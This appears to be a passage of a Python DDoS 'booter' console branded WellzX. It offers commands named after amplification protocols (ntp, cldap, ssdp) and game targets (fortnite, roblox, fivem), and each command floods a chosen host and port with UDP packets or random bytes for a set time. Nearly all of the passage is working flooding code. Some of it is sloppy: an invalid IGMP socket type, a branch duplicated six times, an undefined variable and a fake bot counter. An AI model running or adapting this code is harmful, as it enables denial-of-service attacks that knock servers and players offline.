    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m \033[0m\033[38;2;149;109;216m \033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219m \033[0m\033[38;2;142;112;219m \033[0m\033[38;2;139;111;220m \033[0m\033[38;2;136;111;220m╚\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m╝\033[0m

"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2; WellzX. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[0;30;101m𝚂𝚎𝚡𝙱𝚛𝚒𝚗𝚐𝚜 @ 𝚆𝚎𝚕𝚕𝚣𝚇\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			os.system ("")
			print (help)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[1;37;40mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "snmp":
			try:
				if running >= 999:
					print("\033[97myou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cldap":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mServer...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ard":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ntp":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "home-hold":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully sent attack to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "std":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-tcp":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕??𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydra":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				   main()
		elif sinput == "nfo-bypass":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				   main()
		elif sinput == "tcp-abuse":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				   main()
		elif sinput == "tcpproxyv2":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				   main()
		elif sinput == "100up":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				   main()
		elif sinput == "port-crash":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnite":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox":
			try:
				if running >= 91:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31m𝚆𝚎𝚕𝚕𝚣𝚇 \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
         

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

